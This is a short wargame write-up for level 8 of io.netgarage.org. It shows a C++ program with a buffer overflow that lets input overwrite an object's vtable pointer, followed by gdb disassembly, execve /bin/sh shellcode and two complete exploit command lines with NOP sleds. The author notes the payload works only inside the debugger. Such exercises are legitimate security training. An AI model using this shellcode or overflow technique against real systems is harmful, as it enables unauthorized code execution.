## Level 8:

```cpp
 1 // writen by bla for io.netgarage.org
 2 #include <iostream>
 3 #include <cstring>
 4 #include <unistd.h>
 5 
 6 class Number
 7 {
 8         public:
 9                 Number(int x) : number(x) {}
10                 void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
11                 virtual int operator+(Number &r) {return number + r.number;}
12         private:
13                 char annotation[100];
14                 int number;
15 };
16 
17 
18 int main(int argc, char **argv)
19 {
20         if(argc < 2) _exit(1);
21 
22         Number *x = new Number(5);
23         Number *y = new Number(6);
24         Number &five = *x, &six = *y;
25 
26         five.setAnnotation(argv[1]);
27 
28         return six + five;
29 }
```

```console
(gdb) disass main
Dump of assembler code for function main:
   ...
=> 0x08048726 <+146>:	mov    (%eax),%edx
   0x08048728 <+148>:	mov    0x18(%esp),%eax
   0x0804872c <+152>:	mov    %eax,0x4(%esp)
   0x08048730 <+156>:	mov    0x1c(%esp),%eax
   0x08048734 <+160>:	mov    %eax,(%esp)
   0x08048737 <+163>:	call   *%edx
   0x08048739 <+165>:	add    $0x2c,%esp
   ...
```

```
shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

```console
(gdb) r $(python -c 'print "\x10\xea\x04\x08" + "\x90"*81 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbd\xfd\xff\xbf"')
```

After adjusting for unknown offset, I lowered the address by around 0x60, it did connect to the NOP slide and executed shell. 

```console
(gdb) r $(python -c 'print "\xa8\xe9\x04\x08" + "\x90"*81 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbd\xfd\xff\xbf"')
```

This exact version of the payload doesn't work outside the gdb!
